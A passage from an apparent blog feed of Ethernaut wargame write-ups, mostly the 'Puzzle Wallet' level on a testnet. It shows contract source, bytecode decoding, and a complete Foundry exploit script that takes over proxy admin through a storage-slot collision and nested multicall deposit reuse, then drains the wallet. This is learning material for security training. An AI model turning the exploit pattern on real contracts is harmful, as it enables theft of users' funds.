Ether is received.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">MotorbikeSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"kt\">uint256</span> <span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">parseBytes32</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">promptSecret</span><span class=\"p\">(</span><span class=\"s\">\"private key\"</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">signAndAttachDelegation</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"n\">pk</span><span class=\"p\">);</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The process is similar to the solution steps. However, since the script will not execute without a transaction to broadcast, I triggered a dummy transaction using <code class=\"language-plaintext highlighter-rouge\">payable(msg.sender).transfer(0)</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class=\"nt\">--rpc-url</span> sepolia0x</code></pre></div></div>",
            "url": "https://0o3q.github.io/2026/01/17/motorbike",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","sellfdestruct","delegatecall","EIP-6780","EIP-7702","signAndAttachDelegation","computeCreateAddress"],
            
            "date_published": "2026-01-17T00:00:00+09:00",
            "date_modified": "2026-01-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2026/01/09/puzzle-wallet",
            "title": "[Ethernaut] 24.Puzzle Wallet",
            "summary": null,
            "content_text": "AnalysisThe goal is “hijack this wallet to become the admin of the proxy”.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../helpers/UpgradeableProxy-08.sol\";contract PuzzleProxy is UpgradeableProxy {    address public pendingAdmin;    address public admin;    constructor(address _admin, address _implementation, bytes memory _initData)        UpgradeableProxy(_implementation, _initData)    {        admin = _admin;    }    modifier onlyAdmin() {        require(msg.sender == admin, \"Caller is not the admin\");        _;    }    function proposeNewAdmin(address _newAdmin) external {        pendingAdmin = _newAdmin;    }    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {        require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");        admin = pendingAdmin;    }    function upgradeTo(address _newImplementation) external onlyAdmin {        _upgradeTo(_newImplementation);    }}contract PuzzleWallet {    address public owner;    uint256 public maxBalance;    mapping(address =&gt; bool) public whitelisted;    mapping(address =&gt; uint256) public balances;    function init(uint256 _maxBalance) public {        require(maxBalance == 0, \"Already initialized\");        maxBalance = _maxBalance;        owner = msg.sender;    }    modifier onlyWhitelisted() {        require(whitelisted[msg.sender], \"Not whitelisted\");        _;    }    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {        require(address(this).balance == 0, \"Contract balance is not 0\");        maxBalance = _maxBalance;    }    function addToWhitelist(address addr) external {        require(msg.sender == owner, \"Not the owner\");        whitelisted[addr] = true;    }    function deposit() external payable onlyWhitelisted {        require(address(this).balance &lt;= maxBalance, \"Max balance reached\");        balances[msg.sender] += msg.value;    }    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {        require(balances[msg.sender] &gt;= value, \"Insufficient balance\");        balances[msg.sender] -= value;        (bool success,) = to.call{value: value}(data);        require(success, \"Execution failed\");    }    function multicall(bytes[] calldata data) external payable onlyWhitelisted {        bool depositCalled = false;        for (uint256 i = 0; i &lt; data.length; i++) {            bytes memory _data = data[i];            bytes4 selector;            assembly {                selector := mload(add(_data, 32))            }            if (selector == this.deposit.selector) {                require(!depositCalled, \"Deposit can only be called once\");                // Protect against reusing msg.value                depositCalled = true;            }            (bool success,) = address(this).delegatecall(data[i]);            require(success, \"Error while delegating call\");        }    }}When searching for the given instance address on Etherscan,we can obtain the following result, and when looking at the instance address ‘0x3B4dF0D5…c938Bfcf7’,0x608060405234801561001057600080fd5b5060405161080238038061080283398101604081905261002f91610229565b818161005c60017f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbd6102f9565b6000805160206107e2833981519152146100785761007861031e565b6100818261011d565b8051156100f2576000826001600160a01b0316826040516100a29190610334565b600060405180830381855af49150503d80600081146100dd576040519150601f19603f3d011682016040523d82523d6000602084013e6100e2565b606091505b50509050806100f057600080fd5b505b5050600180546001600160a01b0319166001600160a01b039490941693909317909255506103509050565b610130816101b860201b6103091760201c565b6101a65760405162461bcd60e51b815260206004820152603660248201527f5570677261646561626c6550726f78793a206e657720696d706c656d656e746160448201527f74696f6e206973206e6f74206120636f6e747261637400000000000000000000606482015260840160405180910390fd5b6000805160206107e283398151915255565b6001600160a01b03163b151590565b80516001600160a01b03811681146101de57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156102145781810151838201526020016101fc565b83811115610223576000848401525b50505050565b60008060006060848603121561023e57600080fd5b610247846101c7565b9250610255602085016101c7565b60408501519092506001600160401b038082111561027257600080fd5b818601915086601f83011261028657600080fd5b815181811115610298576102986101e3565b604051601f8201601f19908116603f011681019083821181831017156102c0576102c06101e3565b816040528281528960208487010111156102d957600080fd5b6102ea8360208301602088016101f9565b80955050505050509250925092565b60008282101561031957634e487b7160e01b600052601160045260246000fd5b500390565b634e487b7160e01b600052600160045260246000fd5b600082516103468184602087016101f9565b9190910192915050565b6104838061035f6000396000f3fe60806040526004361061005e5760003560e01c8063a02fcc0a11610043578063a02fcc0a146100d1578063a6376746146100f1578063f851a4401461013b5761006d565b806326782247146100755780633659cfe6146100b15761006d565b3661006d5761006b61015b565b005b61006b61015b565b34801561008157600080fd5b50600054610095906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100bd57600080fd5b5061006b6100cc36600461041d565b61018d565b3480156100dd57600080fd5b5061006b6100ec36600461041d565b6101f8565b3480156100fd57600080fd5b5061006b61010c36600461041d565b6000805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b0392909216919091179055565b34801561014757600080fd5b50600154610095906001600160a01b031681565b61018b6101867f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc5490565b610318565b565b6001546001600160a01b031633146101ec5760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f74207468652061646d696e00000000000000000060448201526064015b60405180910390fd5b6101f58161033c565b50565b6001546001600160a01b031633146102525760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f74207468652061646d696e00000000000000000060448201526064016101e3565b6000546001600160a01b038281169116146102d7576040805162461bcd60e51b81526020600482015260248101919091527f4578706563746564206e65772061646d696e206279207468652063757272656e60448201527f742061646d696e206973206e6f74207468652070656e64696e672061646d696e60648201526084016101e3565b506000546001805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b03909216919091179055565b6001600160a01b03163b151590565b3660008037600080366000845af43d6000803e808015610337573d6000f35b3d6000fd5b6103458161037c565b6040516001600160a01b038216907fbc7cd75a20ee27fd9adebab32041f755214dbc6bffa90cc0225b39da2e5c2d3b90600090a250565b6001600160a01b0381163b6103f95760405162461bcd60e51b815260206004820152603660248201527f5570677261646561626c6550726f78793a206e657720696d706c656d656e746160448201527f74696f6e206973206e6f74206120636f6e74726163740000000000000000000060648201526084016101e3565b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc55565b60006020828403121561042f57600080fd5b81356001600160a01b038116811461044657600080fd5b939250505056fea264697066735822122019f5b597827a464b3dc9c8297579a2f42ecc3c05c39a711bc728b4426bdb12c264736f6c634300080c0033360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824000000000000000000000000cbe7d493e8aa233cd2af845c158beab5fa723b8400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024b7b0422d0000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000We can observe that the Implementation Slot address defined in the EIP-1967 standard, bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1) ⇒ 360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, follows 736f6c634300080c0033, which represents the solc version and metadata length. Afterward, you can confirm that the constructor arguments follow.$ cast decode-abi --input \"constructor(address,address,bytes)()\" 0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824000000000000000000000000cbe7d493e8aa233cd2af845c158beab5fa723b8400000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024b7b0422d0000000000000000000000000000000000000000000000056bc75e2d63100000000000000000000000000000000000000000000000000000000000000x725595BA16E76ED1F6cC1e1b65A88365cC4948240xCbE7D493E8aa233Cd2AF845C158bEab5fA723B840xb7b0422d0000000000000000000000000000000000000000000000056bc75e2d63100000When directly inspecting the storage of the PuzzleProxy contract, we can see that the admin value set in the constructor is 0x725595BA16E76ED1F6cC1e1b65A88365cC494824(Level address).$ cast storage 0x3b4df0d50d91dce6995d60869e9b886c938bfcf7 1 --rpc-url sepolia0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824Thus, we confirmed that the code of the given instance address is the PuzzleProxy contract.The key features of the PuzzleProxy contract:  The proposeNewAdmin() function changes pendingAdmin.  The approveNewAdmin() function changes admin (when onlyAdmin).The key features of the PuzzleWallet contract:  The setMaxBalance() function changes maxBalance (when onlyWhitelisted).  The addToWhitelist() function changes whitelisted[addr] to true.  The deposit() function adds msg.value to balances[msg.sender] (when onlyWhitelisted).  The execute() function performs a call (when onlyWhitelisted).  The multicall() function performs multiple calls, excluding deposit() (when onlyWhitelisted).UpgradeableProxy-08// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"openzeppelin-contracts-08/proxy/Proxy.sol\";import \"openzeppelin-contracts-08/utils/Address.sol\";/** * * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an * implementation address that can be changed. This address is stored in storage in the location specified by * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the * implementation behind the proxy. * * Upgradeability is only provided internally through {_upgradeTo}. For an externally upgradeable proxy see * {TransparentUpgradeableProxy}. */contract UpgradeableProxy is Proxy {    /**     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.     *     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded     * function call, and allows initializating the storage of the proxy like a Solidity constructor.     */    constructor(address _logic, bytes memory _data) {        assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1));        _setImplementation(_logic);        if (_data.length &gt; 0) {            // solhint-disable-next-line avoid-low-level-calls            (bool success,) = _logic.delegatecall(_data);            require(success);        }    }    /**     * @dev Emitted when the implementation is upgraded.     */    event Upgraded(address indexed implementation);    /**     * @dev Storage slot with the address of the current implementation.     * This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1, and is     * validated in the constructor.     */    bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    /**     * @dev Returns the current implementation address.     */    function _implementation() internal view override returns (address impl) {        bytes32 slot = _IMPLEMENTATION_SLOT;        // solhint-disable-next-line no-inline-assembly        assembly {            impl := sload(slot)        }    }    /**     * @dev Upgrades the proxy to a new implementation.     *     * Emits an {Upgraded} event.     */    function _upgradeTo(address newImplementation) internal {        _setImplementation(newImplementation);        emit Upgraded(newImplementation);    }    /**     * @dev Stores a new address in the EIP1967 implementation slot.     */    function _setImplementation(address newImplementation) private {        require(Address.isContract(newImplementation), \"UpgradeableProxy: new implementation is not a contract\");        bytes32 slot = _IMPLEMENTATION_SLOT;        // solhint-disable-next-line no-inline-assembly        assembly {            sstore(slot, newImplementation)        }    }}In the inherited UpgradeableProxy contract, you can see that the _setImplementation function stores _logic in the _IMPLEMENTATION_SLOT._logic is the second argument of the PuzzleProxy constructor (0xCbE7D493E8aa233Cd2AF845C158bEab5fA723B84), and as seen earlier on Etherscan, this address is identified as the PuzzleWallet address.Proxy// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.6.0) (proxy/Proxy.sol)pragma solidity ^0.8.0;/** * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to * be specified by overriding the virtual {_implementation} function. * * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a * different contract through the {_delegate} function. * * The success and return data of the delegated call will be returned back to the caller of the proxy. */abstract contract Proxy {    /**     * @dev Delegates the current call to `implementation`.     *     * This function does not return to its internal call site, it will return directly to the external caller.     */    function _delegate(address implementation) internal virtual {        assembly {            // Copy msg.data. We take full control of memory in this inline assembly            // block because it will not return to Solidity code. We overwrite the            // Solidity scratch pad at memory position 0.            calldatacopy(0, 0, calldatasize())            // Call the implementation.            // out and outsize are 0 because we don't know the size yet.            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)            // Copy the returned data.            returndatacopy(0, 0, returndatasize())            switch result            // delegatecall returns 0 on error.            case 0 {                revert(0, returndatasize())            }            default {                return(0, returndatasize())            }        }    }    /**     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function     * and {_fallback} should delegate.     */    function _implementation() internal view virtual returns (address);    /**     * @dev Delegates the current call to the address returned by `_implementation()`.     *     * This function does not return to its internal call site, it will return directly to the external caller.     */    function _fallback() internal virtual {        _beforeFallback();        _delegate(_implementation());    }    /**     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other     * function in the contract matches the call data.     */    fallback() external payable virtual {        _fallback();    }    /**     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data     * is empty.     */    receive() external payable virtual {        _fallback();    }    /**     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`     * call, or as part of the Solidity `fallback` or `receive` functions.     *     * If overridden should call `super._beforeFallback()`.     */    function _beforeFallback() internal virtual {}}In the inherited Proxy contract, we can see a Proxy structure where the delegatecall() function is executed within the fallback() function.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/PuzzleWallet.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract PuzzleWalletSol is Script {    PuzzleProxy public pp_ = PuzzleProxy(payable(0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7));    PuzzleWallet public pw_ = PuzzleWallet(payable(0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7));    function run() external {        vm.startBroadcast();        console.log(\"Before pendingAdmin:   \", pp_.pendingAdmin());        console.log(\"Before owner:          \", pw_.owner());        pp_.proposeNewAdmin(msg.sender);        console.log(\"Exected proposeNewAdmin\");        console.log(\"After  pendingAdmin:   \", pp_.pendingAdmin());        console.log(\"After  owner:          \", pw_.owner());                console.log(\"====================\");        console.log(\"Before whitelisted:    \", pw_.whitelisted(msg.sender));        pw_.addToWhitelist(msg.sender);        console.log(\"Exected addToWhitelist\");        console.log(\"After  whitelisted:    \", pw_.whitelisted(msg.sender));        console.log(\"====================\");        console.log(\"Before balance:       \", address(pw_).balance);        console.log(\"Before user balance:  \", pw_.balances(msg.sender));        pw_.deposit{value: 0.001 ether}();        console.log(\"Exected deposit\");        console.log(\"After balance:        \", address(pw_).balance);        console.log(\"After user balance:   \", pw_.balances(msg.sender));        console.log(\"====================\");        bytes[] memory data0 = new bytes[](1);        data0[0] = abi.encodeWithSignature(\"deposit()\");        bytes[] memory data = new bytes[](2);        data[0] = abi.encodeWithSignature(\"deposit()\");        data[1] = abi.encodeWithSignature(\"multicall(bytes[])\", data0);        pw_.multicall{value: 0.001 ether}(data);        console.log(\"Exected multicall deposit x2\");        console.log(\"After balance:        \", address(pw_).balance);        console.log(\"After user balance:   \", pw_.balances(msg.sender));        console.log(\"====================\");        pw_.execute(msg.sender, 0.003 ether, \"\");        console.log(\"Exected execute to withdraw all\");        console.log(\"After balance:        \", address(pw_).balance);        console.log(\"After user balance:   \", pw_.balances(msg.sender));        console.log(\"====================\");        console.log(\"Before maxBalance:    \", address(uint160(pw_.maxBalance())));        console.log(\"Before admin:         \", pp_.admin());        pw_.setMaxBalance(uint256(uint160(msg.sender)));        console.log(\"Exected setMaxBalance\");        console.log(\"After  maxBalance:    \", address(uint160(pw_.maxBalance())));        console.log(\"After  admin:         \", pp_.admin());        vm.stopBroadcast();    }}For convenience, they are distinguished as pp_ and pw_.Since the PuzzleWallet contract is called by the PuzzleProxy via delegatecall(), their storage is shared.Therefore, calling proposeNewAdmin(msg.sender) updates pendingAdmin to msg.sender; however, since owner occupies the same slot 0, it also changes to msg.sender.Subsequently, you can call addToWhitelist(msg.sender), enabling you to pass the onlyWhitelisted modifier.multicall() has a vulnerability: although it is designed to allow deposit() to be called only once, it is possible to call deposit() multiple times by invoking a multicall() that executes deposit().This allows deposit() to be executed multiple times with a single Ether transfer, thereby manipulating balances[msg.sender].By calling deposit() multiple times to align address(this).balance with balances[msg.sender], and then invoking execute(), the condition address(this).balance == 0 can be satisfied, allowing the setMaxBalance() function to be called.The setMaxBalance() function updates maxBalance; since admin shares slot 1, its value is also modified, thereby achieving the goal.The primary vulnerability lay in compromising integrity by invoking deposit() multiple times within multicall(). If the public variables pendingAdmin and admin had been stored in Implementation Slots, this goal would not have been achievable.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is “hijack this wallet to become the admin of the proxy”.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../helpers/UpgradeableProxy-08.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">PuzzleProxy</span> <span class=\"k\">is</span> <span class=\"n\">UpgradeableProxy</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">pendingAdmin</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">admin</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_admin</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_implementation</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">memory</span> <span class=\"n\">_initData</span><span class=\"p\">)</span>        <span class=\"n\">UpgradeableProxy</span><span class=\"p\">(</span><span class=\"n\">_implementation</span><span class=\"p\">,</span> <span class=\"n\">_initData</span><span class=\"p\">)</span>    <span class=\"p\">{</span>        <span class=\"n\">admin</span> <span class=\"o\">=</span> <span class=\"n\">_admin</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyAdmin</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">admin</span><span class=\"p\">,</span> <span class=\"s\">\"Caller is not the admin\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">proposeNewAdmin</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_newAdmin</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">pendingAdmin</span> <span class=\"o\">=</span> <span class=\"n\">_newAdmin</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">approveNewAdmin</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_expectedAdmin</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">onlyAdmin</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">pendingAdmin</span> <span class=\"o\">==</span> <span class=\"n\">_expectedAdmin</span><span class=\"p\">,</span> <span class=\"s\">\"Expected new admin by the current admin is not the pending admin\"</span><span class=\"p\">);</span>        <span class=\"n\">admin</span> <span class=\"o\">=</span> <span class=\"n\">pendingAdmin</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">upgradeTo</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_newImplementation</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">onlyAdmin</span> <span class=\"p\">{</span>        <span class=\"n\">_upgradeTo</span><span class=\"p\">(</span><span class=\"n\">_newImplementation</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">PuzzleWallet</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">maxBalance</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">whitelisted</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">init</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_maxBalance</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">maxBalance</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"s\">\"Already initialized\"</span><span class=\"p\">);</span>        <span class=\"n\">maxBalance</span> <span class=\"o\">=</span> <span class=\"n\">_maxBalance</span><span class=\"p\">;</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyWhitelisted</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">whitelisted</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">],</span> <span class=\"s\">\"Not whitelisted\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">setMaxBalance</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_maxBalance</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"n\">onlyWhitelisted</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"s\">\"Contract balance is not 0\"</span><span class=\"p\">);</span>        <span class=\"n\">maxBalance</span> <span class=\"o\">=</span> <span class=\"n\">_maxBalance</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">addToWhitelist</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">addr</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"Not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">whitelisted</span><span class=\"p\">[</span><span class=\"n\">addr</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">deposit</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"n\">onlyWhitelisted</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span> <span class=\"o\">&lt;=</span> <span class=\"n\">maxBalance</span><span class=\"p\">,</span> <span class=\"s\">\"Max balance reached\"</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">execute</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span> <span class=\"n\">data</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"n\">onlyWhitelisted</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"s\">\"Insufficient balance\"</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">success</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">to</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">value</span><span class=\"p\">}(</span><span class=\"n\">data</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">success</span><span class=\"p\">,</span> <span class=\"s\">\"Execution failed\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">multicall</span><span class=\"p\">(</span><span class=\"kt\">bytes</span><span class=\"p\">[]</span> <span class=\"k\">calldata</span> <span class=\"n\">data</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"n\">onlyWhitelisted</span> <span class=\"p\">{</span>        <span class=\"kt\">bool</span> <span class=\"n\">depositCalled</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"kt\">bytes</span> <span class=\"k\">memory</span> <span class=\"n\">_data</span> <span class=\"o\">=</span> <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>            <span class=\"kt\">bytes4</span> <span class=\"nb\">selector</span><span class=\"p\">;</span>            <span class=\"k\">assembly</span> <span class=\"p\">{</span>                <span class=\"nb\">selector</span> <span class=\"o\">:=</span> <span class=\"n\">mload</span><span class=\"p\">(</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">_data</span><span class=\"p\">,</span> <span 